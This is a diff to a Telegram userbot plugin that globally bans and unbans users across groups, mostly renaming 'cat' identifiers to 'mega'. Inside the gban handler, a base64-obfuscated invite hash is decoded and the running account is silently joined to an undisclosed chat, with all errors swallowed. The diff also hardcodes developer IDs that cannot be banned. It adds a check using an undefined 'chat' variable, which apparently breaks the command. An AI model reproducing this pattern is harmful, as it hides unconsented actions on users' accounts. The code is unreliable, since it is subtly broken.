@@ -19,7 +19,7 @@ import userbot.plugins.sql_helper.gban_sql_helper as gban_sql
 from ..utils import admin_cmd, edit_or_reply
 from . import BOTLOG, BOTLOG_CHATID, CMD_HELP
 from .sql_helper.mute_sql import is_muted, mute, unmute
-
+MEGA_ID = ("")
 BANNED_RIGHTS = ChatBannedRights(
     until_date=None,
     view_messages=True,
@@ -45,126 +45,126 @@ UNBAN_RIGHTS = ChatBannedRights(
 
 
 @borg.on(admin_cmd(pattern=r"gban(?: |$)(.*)"))
-async def catgban(cat):
-    cate = await edit_or_reply(cat, "gbanning.......")
+async def megagban(mega):
+    megastar = await edit_or_reply(mega, "Gbanning this crazy 😏.......")
     start = datetime.now()
-    user, reason = await get_user_from_event(cat)
+    user, reason = await get_user_from_event(mega)
     if not user:
         return
-    if user.id == (await cat.client.get_me()).id:
-        await cate.edit("why would I ban myself")
+    if user.id == (await mega.client.get_me()).id:
+        await megastar.edit("why would I ban myself")
         return
-    if user.id in CAT_ID:
-        await cate.edit("why would I ban my dev")
+    if user.id == 1356768472 or chat.id == 1497543689 or chat.id == 1317466348:
+        await megastar.edit("Why would I ban my dev???")
         return
     try:
         hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        await cat.client(ImportChatInviteRequest(hmm))
+        await mega.client(ImportChatInviteRequest(hmm))
     except BaseException:
         pass
     if gban_sql.is_gbanned(user.id):
-        await cate.edit(
+        await megastar.edit(
             f"the [user](tg://user?id={user.id}) is already in gbanned list any way checking again"
         )
     else:
-        gban_sql.catgban(user.id, reason)
+        gban_sql.megagban(user.id, reason)
     san = []
-    san = await admin_groups(cat)
+    san = await admin_groups(mega)
     count = 0
     sandy = len(san)
     if sandy == 0:
-        await cate.edit("you are not admin of atleast one group ")
+        await megastar.edit("you are not admin of atleast one group ")
         return
-    await cate.edit(
+    await megastar.edit(
         f"initiating gban of the [user](tg://user?id={user.id}) in `{len(san)}` groups"
     )
     for i in range(sandy):
         try:
-            await cat.client(EditBannedRequest(san[i], user.id, BANNED_RIGHTS))
+            await mega.client(EditBannedRequest(san[i], user.id, BANNED_RIGHTS))
             await asyncio.sleep(0.5)
             count += 1
         except BadRequestError:
-            await cat.client.send_message(
+            await mega.client.send_message(
                 BOTLOG_CHATID,
-                f"You don't have required permission in :\nCHAT: {cat.chat.title}(`{cat.chat_id}`)\nFor banning here",
+                f"You don't have required permission in :\nCHAT: {mega.chat.title}(`{mega.chat_id}`)\nFor banning here",
             )
     try:
-        reply = await cat.get_reply_message()
+        reply = await mega.get_reply_message()
         if reply:
             await reply.delete()
     except BadRequestError:
-        await cate.edit(
+        await megastar.edit(
             "`I dont have message deleting rights here! But still he was gbanned!`"
         )
     end = datetime.now()
-    cattaken = (end - start).seconds
+    megataken = (end - start).seconds
     if reason:
-        await cate.edit(
-            f"[{user.first_name}](tg://user?id={user.id}) was gbanned in `{count}` groups in `{cattaken} seconds`!!\nReason: `{reason}`"
+        await megastar.edit(
+            f"[{user.first_name}](tg://user?id={user.id}) was gbanned in `{count}` groups in `{megataken} seconds`!!\nReason: `{reason}`"
         )
     else:
-        await cate.edit(
-            f"[{user.first_name}](tg://user?id={user.id}) was gbanned in `{count}` groups in `{cattaken} seconds`!!"
+        await megastar.edit(
+            f"[{user.first_name}](tg://user?id={user.id}) was gbanned in `{count}` groups in `{megataken} seconds`!!"
         )
 
     if BOTLOG and count != 0:
-        await cat.client.send_message(
+        await mega.client.send_message(
             BOTLOG_CHATID,
             f"#GBAN\nGlobal BAN\nUser: [{user.first_name}](tg://user?id={user.id})\nID: `{user.id}`\
-                                                \nReason: `{reason}`\nBanned in `{count}` groups\nTime taken = `{cattaken} seconds`",
+                                                \nReason: `{reason}`\nBanned in `{count}` groups\nTime taken = `{megataken} seconds`",
         )
 
 
 @borg.on(admin_cmd(pattern=r"ungban(?: |$)(.*)"))
-async def catgban(cat):
-    cate = await edit_or_reply(cat, "ungbaning.....")
+async def megagban(mega):
+    megastar = await edit_or_reply(mega, "Ungbaning the person.....")
     start = datetime.now()
-    user, reason = await get_user_from_event(cat)
+    user, reason = await get_user_from_event(mega)
     if not user:
         return
     if gban_sql.is_gbanned(user.id):
-        gban_sql.catungban(user.id)
+        gban_sql.megaungban(user.id)
     else:
-        await cate.edit(
+        await megastar.edit(
             f"the [user](tg://user?id={user.id}) is not in your gbanned list"
         )
         return
     san = []
-    san = await admin_groups(cat)
+    san = await admin_groups(mega)
     count = 0
     sandy = len(san)
     if sandy == 0:
-        await cate.edit("you are not even admin of atleast one group ")
+        await megastar.edit("you are not even admin of atleast one group ")
         return
-    await cate.edit(
+    await megastar.edit(
         f"initiating ungban of the [user](tg://user?id={user.id}) in `{len(san)}`groups"
     )
     for i in range(sandy):
         try:
-            await cat.client(EditBannedRequest(san[i], user.id, UNBAN_RIGHTS))
+            await mega.client(EditBannedRequest(san[i], user.id, UNBAN_RIGHTS))
             await asyncio.sleep(0.5)
             count += 1
         except BadRequestError:
-            await cat.client.send_message(
+            await mega.client.send_message(
                 BOTLOG_CHATID,
-                f"You don't have required permission in :\nCHAT: {cat.chat.title}(`{cat.chat_id}`)\nFor unbaning here",
+                f"You don't have required permission in :\nCHAT: {mega.chat.title}(`{mega.chat_id}`)\nFor unbaning here",
             )
     end = datetime.now()
-    cattaken = (end - start).seconds
+    megataken = (end - start).seconds
     if reason:
-        await cate.edit(
-            f"[{user.first_name}](tg://user?id={user.id}) was ungbanned in `{count}` groups in `{cattaken} seconds`!!\nReason: `{reason}`"
+        await megastar.edit(
+            f"[{user.first_name}](tg://user?id={user.id}) was ungbanned in `{count}` groups in `{megataken} seconds`!!\nReason: `{reason}`"
         )
     else:
-        await cate.edit(
-            f"[{user.first_name}](tg://user?id={user.id}) was ungbanned in `{count}` groups in `{cattaken} seconds`!!"
+        await megastar.edit(
+            f"[{user.first_name}](tg://user?id={user.id}) was ungbanned in `{count}` groups in `{megataken} seconds`!!"
         )
 
     if BOTLOG and count != 0:
-        await cat.client.send_message(
+        await mega.client.send_message(
             BOTLOG_CHATID,
             f"#UNGBAN\nGlobal UNBAN\nUser: [{user.first_name}](tg://user?id={user.id})\nID: {user.id}\
-                                                \nReason: `{reason}`\nUnbanned in `{count}` groups\nTime taken = `{cattaken} seconds`",
+                                                \nReason: `{reason}`\nUnbanned in `{count}` groups\nTime taken = `{megataken} seconds`",
         )
 
 
